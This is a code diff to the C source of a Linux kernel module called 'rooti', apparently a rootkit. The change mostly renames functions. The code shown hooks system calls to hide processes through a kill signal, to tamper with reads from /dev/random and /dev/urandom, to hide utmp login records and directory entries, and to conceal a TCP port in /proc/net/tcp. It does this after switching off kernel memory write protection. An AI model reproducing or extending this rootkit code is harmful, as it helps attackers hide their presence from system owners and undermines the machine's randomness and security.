@@ -4,6 +4,7 @@
 #include <linux/types.h>
 #include <linux/string.h>
 #include <linux/uaccess.h>
+#include <linux/dirent.h>
 #include <linux/seq_file.h>
 #include <net/sock.h>
 #include <net/tcp.h>
@@ -44,17 +45,17 @@ struct list_head *rooti_tracked_fds_lists[] = {
 };
 
 // References to the original syscall handlers which we are hooking
-static asmlinkage long (*rooti_orig_kill)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_openat)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_close)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_dup2)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_read)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_pread64)(const struct pt_regs *regs);
-static asmlinkage long (*rooti_orig_getdents64)(const struct pt_regs *regs);
+static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
+static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
+static asmlinkage long (*orig_close)(const struct pt_regs *regs);
+static asmlinkage long (*orig_dup2)(const struct pt_regs *regs);
+static asmlinkage long (*orig_read)(const struct pt_regs *regs);
+static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
+static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
-static int (*rooti_orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 
-static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
+static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
     int sig = regs->si;
     if (sig == ROOTI_SIG_HIDE) {
@@ -70,18 +71,18 @@ static asmlinkage long rooti_hook_kill(const struct pt_regs *regs)
         // Register the new process
         return rooti_register_client(&rooti_client_proc);
     }
-    return rooti_orig_kill(regs);
+    return orig_kill(regs);
 }
 
 
-static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
+static asmlinkage long hook_openat(const struct pt_regs *regs)
 {
     // Allocate a kernel buffer to store the requested filename
     char *filepath_user = (char *)regs->si;
     char *filepath_kernel = kmalloc(NAME_MAX, GFP_KERNEL);
     if (filepath_kernel == NULL) {
         printk(KERN_DEBUG "rooti: failed to allocate memory\n");
-        return rooti_orig_openat(regs);
+        return orig_openat(regs);
     }
 
     // Copy the requested filename to the kernel mode buffer
@@ -89,11 +90,11 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
     if (err > 0) {
         printk(KERN_DEBUG "rooti: copy_from_user() failed\n");
         kfree(filepath_kernel);
-        return rooti_orig_openat(regs);
+        return orig_openat(regs);
     }
 
     // Invoke the original syscall
-    int fd = rooti_orig_openat(regs);
+    int fd = orig_openat(regs);
     
     // Check if the requested file to open is one of the two Linux char devices providing random bytes
     if (strncmp(filepath_kernel, "/dev/random", NAME_MAX) == 0 || strncmp(filepath_kernel, "/dev/urandom", NAME_MAX) == 0) {
@@ -112,7 +113,7 @@ static asmlinkage long rooti_hook_openat(const struct pt_regs *regs)
     return fd;
 }
 
-static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
+static asmlinkage long hook_close(const struct pt_regs *regs)
 {
     pid_t pid = current->pid;
     int fd = regs->di;
@@ -127,14 +128,14 @@ static asmlinkage long rooti_hook_close(const struct pt_regs *regs)
             }
         }
     }
-    return rooti_orig_close(regs);
+    return orig_close(regs);
 }
 
-static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
+static asmlinkage long hook_dup2(const struct pt_regs *regs)
 {
     pid_t pid = current->pid;
     int oldfd = regs->di;
-    int newfd = rooti_orig_dup2(regs);
+    int newfd = orig_dup2(regs);
 
     struct rooti_tracked_fd *record;
     struct rooti_tracked_fd *tmp;
@@ -150,13 +151,13 @@ static asmlinkage long rooti_hook_dup2(const struct pt_regs *regs)
     return newfd;
 }
 
-static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
+static asmlinkage long hook_read(const struct pt_regs *regs)
 {
     pid_t pid = current->pid;
     int fd = regs->di;
     char *user_buf = (char *)regs->si;
     size_t count = regs->dx;
-    size_t nread = rooti_orig_read(regs);
+    size_t nread = orig_read(regs);
     
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_random_tracked_fds, head)  {
@@ -167,14 +168,14 @@ static asmlinkage long rooti_hook_read(const struct pt_regs *regs)
     return nread;
 }
 
-static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
+static asmlinkage long hook_pread64(const struct pt_regs *regs) {
     pid_t pid = current->pid;
     int fd = regs->di;
     size_t count = regs->dx;
     char *user_buf = (char *)regs->si;
 
     // Invoke the original syscall
-    size_t nread = rooti_orig_pread64(regs);
+    size_t nread = orig_pread64(regs);
 
     struct rooti_tracked_fd *record;
     list_for_each_entry(record, &rooti_utmp_tracked_fds, head)  {
@@ -185,12 +186,12 @@ static asmlinkage long rooti_hook_pread64(const struct pt_regs *regs) {
     return nread;
 }
 
-static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
+static asmlinkage long hook_getdents64(const struct pt_regs *regs)
 {
     // Invoke the original syscall
     int fd  = regs->di;
     struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
-    int nread = rooti_orig_getdents64(regs);
+    int nread = orig_getdents64(regs);
     if (nread < 0) {
         return nread;
     }
@@ -247,7 +248,7 @@ static asmlinkage long rooti_hook_getdents64(const struct pt_regs *regs)
     return nread;
 }
 
-static int rooti_hook_tcp4_seq_show(struct seq_file *seq, void *v)
+static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     struct sock *socket = v;
 
@@ -256,19 +257,19 @@ static int rooti_hook_tcp4_seq_show(struct seq_file *seq, void *v)
         return 0;
     }
     // Not the port to hide - calL the original handler
-    return rooti_orig_tcp4_seq_show(seq, v);
+    return orig_tcp4_seq_show(seq, v);
 }
 
 
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
-    ROOTI_HOOK("sys_kill", rooti_hook_kill, &rooti_orig_kill),
-    ROOTI_HOOK("sys_openat", rooti_hook_openat, &rooti_orig_openat),
-    ROOTI_HOOK("sys_close", rooti_hook_close, &rooti_orig_close),
-    ROOTI_HOOK("sys_dup2", rooti_hook_dup2, &rooti_orig_dup2),
-    ROOTI_HOOK("sys_read", rooti_hook_read, &rooti_orig_read),
-    ROOTI_HOOK("sys_pread64", rooti_hook_pread64, &rooti_orig_pread64),
-    ROOTI_HOOK("sys_getdents64", rooti_hook_getdents64, &rooti_orig_getdents64)
+    ROOTI_HOOK("sys_kill", hook_kill, &orig_kill),
+    ROOTI_HOOK("sys_openat", hook_openat, &orig_openat),
+    ROOTI_HOOK("sys_close", hook_close, &orig_close),
+    ROOTI_HOOK("sys_dup2", hook_dup2, &orig_dup2),
+    ROOTI_HOOK("sys_read", hook_read, &orig_read),
+    ROOTI_HOOK("sys_pread64", hook_pread64, &orig_pread64),
+    ROOTI_HOOK("sys_getdents64", hook_getdents64, &orig_getdents64)
 };
 
 /* LKM initialization */
@@ -292,8 +293,8 @@ static int __init rooti_init(void)
     rooti_unprotect_memory();
 
     struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    rooti_orig_tcp4_seq_show = __tcp4_seq_ops->show;
-    __tcp4_seq_ops->show = rooti_hook_tcp4_seq_show;
+    orig_tcp4_seq_show = __tcp4_seq_ops->show;
+    __tcp4_seq_ops->show = hook_tcp4_seq_show;
 
     rooti_protect_memory();
 
@@ -321,7 +322,7 @@ static void __exit rooti_exit(void)
     rooti_unprotect_memory();
 
     struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    __tcp4_seq_ops->show = rooti_orig_tcp4_seq_show;
+    __tcp4_seq_ops->show = orig_tcp4_seq_show;
 
     rooti_protect_memory();
 }
